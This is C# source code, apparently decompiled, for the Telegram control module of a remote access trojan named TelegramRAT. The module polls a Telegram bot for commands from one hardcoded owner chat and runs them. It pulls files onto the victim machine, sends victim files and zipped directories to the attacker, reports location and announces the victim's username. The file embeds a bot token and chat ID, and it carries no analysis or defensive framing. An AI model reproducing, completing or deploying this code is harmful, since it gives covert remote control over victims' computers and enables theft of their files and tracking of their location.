using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Threading;
using SimpleJSON;

namespace TelegramRAT;

internal class telegram
{
	public static int Identifier = 0;

	public static Thread waitCommandsThread = new Thread(waitCommands);

	public static bool waitThreadIsBlocked = false;

	private static void waitForUnblock()
	{
		while (waitThreadIsBlocked)
		{
			Thread.Sleep(200);
		}
	}

	private static void waitCommands()
	{
		waitForUnblock();
		int num = 0;
		string aJSON;
		using (WebClient webClient = new WebClient())
		{
			aJSON = webClient.DownloadString("https://api.telegram.org/bot5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM/getUpdates");
		}
		num = JSON.Parse(aJSON)["result"][0]["update_id"].AsInt;
		while (true)
		{
			Thread.Sleep(config.TelegramCommandCheckDelay * 1000);
			waitForUnblock();
			num++;
			using (WebClient webClient2 = new WebClient())
			{
				aJSON = webClient2.DownloadString(string.Format("https://api.telegram.org/bot{0}/getUpdates?offset={1}", "5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM", num));
			}
			JSONNode.Enumerator enumerator = JSON.Parse(aJSON)["result"].AsArray.GetEnumerator();
			while (enumerator.MoveNext())
			{
				JSONNode jSONNode = enumerator.Current;
				JSONNode jSONNode2 = jSONNode["message"];
				string text = jSONNode2["chat"]["id"];
				num = jSONNode["update_id"].AsInt;
				if (!(text != "2024893777"))
				{
					if (jSONNode2.HasKey("document"))
					{
						string file = jSONNode2["document"]["file_name"];
						string text2 = jSONNode2["document"]["file_id"];
						JSONNode jSONNode3;
						using (WebClient webClient3 = new WebClient())
						{
							jSONNode3 = JSON.Parse(webClient3.DownloadString("https://api.telegram.org/bot5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM/getFile?file_id=" + text2))["result"]["file_path"];
						}
						DownloadFile(file, jSONNode3);
					}
					else if (jSONNode2.HasKey("text"))
					{
						string command = jSONNode2["text"];
						if (command.StartsWith("/"))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								commands.handle(Identifier.ToString(), command);
							});
							thread.SetApartmentState(ApartmentState.STA);
							thread.Start();
						}
					}
					else
					{
						sendText("\ud83c\udf69 Unknown type received. Only Text/Document can be used!");
					}
					continue;
				}
				string text3 = jSONNode2["chat"]["username"];
				string text4 = jSONNode2["chat"]["first_name"];
				sendText("\ud83d\udc51 You not my owner " + text4, text);
				sendText("\ud83d\udc51 Unknown user with id " + text + " and username @" + text3 + " send command to bot!");
				break;
			}
		}
	}

	public static void sendFile(string file, string type = "Document")
	{
		waitForUnblock();
		if (!File.Exists(file))
		{
			sendText("⛔ File not found!");
			return;
		}
		using HttpClient httpClient = new HttpClient();
		MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
		byte[] array = File.ReadAllBytes(file);
		multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), type.ToLower(), file);
		httpClient.PostAsync("https://api.telegram.org/bot5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM/send" + type + "?chat_id=2024893777", multipartFormDataContent).Wait();
		httpClient.Dispose();
	}

	public static void sendText(string text, string chatID = "2024893777")
	{
		waitForUnblock();
		using WebClient webClient = new WebClient();
		webClient.DownloadString("https://api.telegram.org/bot5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM/sendMessage?chat_id=" + chatID + "&text=" + text);
	}

	public static void sendImage(string file)
	{
		sendFile(file, "Photo");
	}

	public static void sendVoice(string file)
	{
		sendFile(file, "Voice");
	}

	public static void sendLocation(float lat, float lon)
	{
		waitForUnblock();
		using WebClient webClient = new WebClient();
		webClient.DownloadString("https://api.telegram.org/bot5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM/sendLocation?chat_id=2024893777&latitude=" + lat + "&longitude=" + lon);
	}

	public static void DownloadFile(string file, string path = "")
	{
		waitForUnblock();
		if (file.StartsWith("http"))
		{
			sendText("\ud83d\udcc4 Downloading file \"" + Path.GetFileName(file) + "\" from url");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri(file), Path.GetFileName(file));
			}
			catch
			{
				sendText($"\ud83d\udca5 Connection error");
				return;
			}
			sendText("\ud83d\udcbe File \"" + file + "\" saved in: \"" + Path.GetFullPath(Path.GetFileName(file)) + "\"");
		}
		else
		{
			sendText("\ud83d\udcc4 Downloading file: \"{file}\"");
			path = "https://api.telegram.org/file/bot5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM/" + path;
			using (WebClient webClient2 = new WebClient())
			{
				webClient2.DownloadFile(new Uri(path), file);
			}
			sendText("\ud83d\udcbe File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
		}
	}

	public static void UploadFile(string file, bool removeAfterUpload = false)
	{
		waitForUnblock();
		if (File.Exists(file))
		{
			sendText("\ud83d\udcc3 Uploading file...");
			sendFile(file);
			if (removeAfterUpload)
			{
				File.Delete(file);
			}
		}
		else if (Directory.Exists(file))
		{
			sendText("\ud83d\udcc1 Uploading directory...");
			string text = file + ".zip";
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			ZipFile.CreateFromDirectory(file, text);
			sendFile(text);
			File.Delete(text);
		}
		else
		{
			sendText("⛔ File not found!");
		}
	}

	public static void sendConnection()
	{
		Identifier = new Random().Next(1, 10000);
		sendText("\ud83c\udf40 Bot " + Environment.UserName.ToString() + " connected with id " + Identifier);
	}
}
